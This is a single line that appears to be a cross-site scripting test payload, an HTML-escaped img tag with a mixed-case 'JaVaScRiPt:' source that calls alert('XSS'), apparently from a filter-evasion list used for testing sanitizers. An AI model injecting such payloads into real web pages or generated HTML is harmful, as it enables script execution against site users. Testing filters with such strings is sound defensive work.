&lt;img src="JaVaScRiPt:alert("XSS&amp;lt;WBR"&gt;")&gt;